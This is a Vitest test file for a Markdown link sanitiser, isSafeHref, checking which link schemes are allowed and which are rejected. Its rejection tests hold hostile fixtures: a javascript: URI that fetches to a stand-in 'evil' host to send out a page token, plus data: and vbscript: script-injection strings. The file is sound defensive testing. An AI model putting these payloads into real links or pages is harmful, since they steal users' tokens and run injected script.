import { describe, expect, it } from 'vitest';
import { isSafeHref } from './MarkdownView.js';

describe('isSafeHref', () => {
  it('allows http, https, mailto, and relative links', () => {
    expect(isSafeHref('https://example.com')).toBe(true);
    expect(isSafeHref('http://example.com')).toBe(true);
    expect(isSafeHref('mailto:a@example.com')).toBe(true);
    expect(isSafeHref('./docs/README.md')).toBe(true);
    expect(isSafeHref('README.md')).toBe(true);
    expect(isSafeHref('#section')).toBe(true);
  });

  it('rejects javascript: URIs (red fixture — agent-authored doc content is untrusted)', () => {
    expect(
      isSafeHref("javascript:fetch('https://evil/steal?t='+window.__DOKIMA_TOKEN__)"),
    ).toBe(false);
    expect(isSafeHref('JavaScript:alert(1)')).toBe(false);
  });

  it('rejects data: and vbscript: URIs', () => {
    expect(isSafeHref('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isSafeHref('vbscript:msgbox(1)')).toBe(false);
  });

  it('rejects unparseable hrefs rather than throwing', () => {
    expect(isSafeHref('http://[::1')).toBe(false);
  });
});
